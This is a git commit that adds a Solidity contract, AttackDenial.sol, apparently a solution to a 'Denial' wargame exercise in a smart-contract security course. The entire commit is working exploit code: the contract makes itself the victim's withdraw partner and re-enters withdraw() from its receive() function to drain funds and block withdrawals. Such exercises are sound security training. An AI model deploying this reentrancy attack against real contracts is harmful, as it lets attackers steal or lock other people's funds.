de3fcb20667d108efb7f5248bc65032d80d52434
tashun <tashun.chamara@gmail.com>
2022-10-06 20:21:03 +0530

    attack denial

---
+++ contracts/Attacks/Stage1/20/AttackDenial.sol
@@ -0,0 +1,25 @@
+pragma solidity ^0.6.0;
+
+import "../../../Exercise/Stage1/20/Denial.sol";
+import "hardhat/console.sol";
+
+contract AttackDenial {
+    Denial denialContract;
+
+    constructor(Denial victimContract) public{
+        denialContract = victimContract;
+    }
+
+    receive() payable external {
+        console.log(denialContract.contractBalance());
+        if (denialContract.contractBalance() > 100) {
+            denialContract.withdraw();
+        }
+    }
+
+    function attack() public {
+        denialContract.setWithdrawPartner(address(this));
+        denialContract.withdraw();
+    }
+
+}
